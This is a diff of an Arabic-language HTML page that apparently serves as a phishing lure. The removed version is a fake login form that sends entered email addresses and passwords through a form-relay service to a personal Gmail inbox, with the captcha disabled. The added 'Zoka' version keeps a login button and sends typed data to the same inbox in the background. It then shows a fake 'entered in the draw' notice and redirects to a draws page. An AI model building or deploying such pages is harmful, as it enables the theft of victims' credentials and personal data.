@@ -2,94 +2,191 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تسجيل الدخول</title>
+    <title>Zoka - إرسال رسالة</title>
     <style>
+        :root {
+            --bg-color: #0b0713;
+            --card-bg: #140e24;
+            --primary: #8a2be2;
+            --primary-hover: #9d4edd;
+            --text-color: #ffffff;
+            --muted-text: #a092b8;
+            --border-color: #2c1e47;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            background-image: radial-gradient(circle at top right, #251147 0%, transparent 60%);
+            color: var(--text-color);
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            overflow: hidden;
         }
-        .container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            width: 350px;
+
+        .login-card {
+            background: var(--card-bg);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5), 0 0 20px rgba(138, 43, 226, 0.15);
+            width: 380px;
             text-align: center;
+            border: 1px solid var(--border-color);
+            backdrop-filter: blur(10px);
+            position: relative;
         }
-        h2 {
-            color: #333;
-            margin-bottom: 20px;
+
+        .logo-area img {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid var(--primary);
+            box-shadow: 0 0 15px rgba(138, 43, 226, 0.5);
+            margin-bottom: 10px;
         }
+
+        .brand-name {
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            margin-bottom: 25px;
+            background: linear-gradient(45deg, #fff, var(--primary-hover));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
         .input-group {
-            margin-bottom: 15px;
+            margin-bottom: 20px;
             text-align: right;
         }
+
         label {
             display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-            color: #666;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: var(--muted-text);
+            font-weight: 500;
         }
+
         input[type="text"] {
             width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
+            padding: 12px 15px;
+            background: #090511;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: white;
             box-sizing: border-box;
-            font-size: 14px;
+            font-size: 15px;
+            transition: all 0.3s ease;
         }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 10px rgba(138, 43, 226, 0.3);
+        }
+
         button {
-            background-color: #4CAF50;
+            background: linear-gradient(135deg, var(--primary), #6a1b9a);
             color: white;
             border: none;
-            padding: 12px 20px;
+            padding: 14px;
             font-size: 16px;
-            border-radius: 5px;
+            font-weight: bold;
+            border-radius: 8px;
             cursor: pointer;
             width: 100%;
-            margin-top: 10px;
-            transition: background 0.3s;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(138, 43, 226, 0.3);
         }
+
         button:hover {
-            background-color: #45a049;
+            background: linear-gradient(135deg, var(--primary-hover), var(--primary));
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(138, 43, 226, 0.5);
+        }
+
+        /* الإشعار العلوي الشفاف */
+        .notification {
+            position: fixed;
+            top: -100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: rgba(0, 200, 83, 0.5); /* شفافية 0.5 ولون أخضر */
+            color: white;
+            backdrop-filter: blur(5px);
+            padding: 15px 40px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            border: 1px solid rgba(0, 200, 83, 0.6);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            z-index: 9999;
+            transition: all 0.5s ease;
+        }
+
+        .notification.show {
+            top: 30px;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>تسجيل الدخول</h2>
+<div class="notification" id="notif">تم التسجيل بالسحب</div>
+
+<div class="login-card">
+    <div class="logo-area">
+        <img src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=150" alt="Zoka Logo">
+    </div>
+    <div class="brand-name">ZOKA</div>
     
-    <!-- فورم إرسال البيانات إلى الإيميل المحدد -->
-    <form action="https://formsubmit.co/ggwesam014@gmail.com" method="POST" id="loginForm">
-        
-        <!-- الحقل الأول -->
+    <form id="msgForm">
         <div class="input-group">
-            <label for="field1">البريد الالكتروني:</label>
-            <input type="text" name="البريد الالكتروني" id="field1" required placeholder="البريد الالكتروني">
+            <label>الموضوع / العنوان:</label>
+            <input type="text" name="subject" required placeholder="اكتب عنوان الرسالة هنا...">
         </div>
 
-        <!-- الحقل الثاني (أصبح صغيراً مثل الأول) -->
         <div class="input-group">
-            <label for="field2">كلمة المرور:</label>
-            <input type="text" name="كلمة المرور" id="field2" required placeholder="كلمة المرور">
+            <label>محتوى النص أو البيانات:</label>
+            <input type="text" name="message" required placeholder="اكتب نص الرسالة هنا...">
         </div>
 
-        <!-- التوجيه لصفحة Home.html في نفس المجلد بعد الإرسال -->
-        <input type="hidden" name="_next" value="Home.html">
-        
-        <!-- إلغاء صفحة التحقق الخاصة بالوسيط للتوجيه المباشر -->
-        <input type="hidden" name="_captcha" value="false">
-
-        <!-- تم تغيير نص الزر إلى تسجيل دخول -->
         <button type="submit">تسجيل دخول</button>
     </form>
 </div>
+
+<script>
+    document.getElementById('msgForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        var formData = new FormData(this);
+        
+        // إرسال الرسالة إلى بريدك الإلكتروني في الخلفية
+        fetch('https://formsubmit.co/ajax/ggwesam014@gmail.com', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            // إظهار الإشعار الأخضر الفاخر في الأعلى
+            var notif = document.getElementById('notif');
+            notif.classList.add('show');
+            
+            // التوجيه التلقائي لصفحة السحوبات بعد ثانيتين
+            setTimeout(function() {
+                window.location.href = 'Home.html';
+            }, 2000);
+        })
+        .catch(error => {
+            // التوجيه حتى لو واجه المتصفح قيوداً محلية أثناء الاختبار
+            window.location.href = 'Home.html';
+        });
+    });
+</script>
 
 </body>
 </html>
